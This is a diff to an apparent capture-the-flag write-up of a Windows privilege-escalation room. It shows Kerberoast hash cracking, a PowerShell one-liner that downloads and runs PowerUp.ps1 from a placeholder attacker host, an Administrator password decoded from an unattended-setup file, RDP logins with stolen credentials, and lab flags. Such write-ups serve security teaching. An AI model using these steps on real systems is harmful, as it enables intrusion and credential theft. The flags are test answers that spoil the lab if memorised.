@@ -149,7 +149,7 @@ hashcat -m 13100 -a 0 hash.txt wordlist --force
 	`flag{bde1642535aa396d2439d86fe54a36e4}`
 
 	```
-	xfreerdp /v:10.10.81.175 /d:corp /u:fela /p:rubenF124 +clipboard
+	xfreerdp /v:$IP /d:corp /u:fela /p:rubenF124 +clipboard
 	```
 
 	![task3-flag](./images/task3-flag.png)
@@ -169,6 +169,8 @@ powershell -ep bypass;
 iex(New-Object Net.WebClient).DownloadString('http://YOUR_IP/PowerUp.ps1') 
 ```
 
+![task4-powerup](./images/task4-powerup.png)
+
 The script has identified several ways to get Administrator access. The first being to bypassUAC and the second is UnattendedPath. We will be exploiting the UnattendPath way.
 
 "Unattended Setup is the method by which original equipment manufacturers (OEMs), corporations, and other users install Windows NT in unattended mode." Read more about it [here](https://support.microsoft.com/en-us/topic/77504e1d-2b75-5be1-3eef-cec3617cc461).
@@ -179,4 +181,22 @@ It is also where users passwords are stored in base64 encoding. Navigate to `C:\
 
 * What is the decoded password?
 
-* Now we have the Administrator's password, login as them and obtain the last flag.
+	`tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T`
+
+	![task4-unattended](./images/task4-unattended.png)
+
+	```
+	echo "dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=" | base64 -d
+	```
+
+	![task4-password](./images/task4-password.png)
+
+* Now we have the Administrator's password, login as them and obtain the last flag
+
+	`THM{g00d_j0b_SYS4DM1n_M4s73R}`
+
+	```
+	xfreerdp /v:$IP /d:corp /u:Administrator /p:'tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T' +clipboard
+	```
+
+	![task4-flag](./images/task4-flag.png)
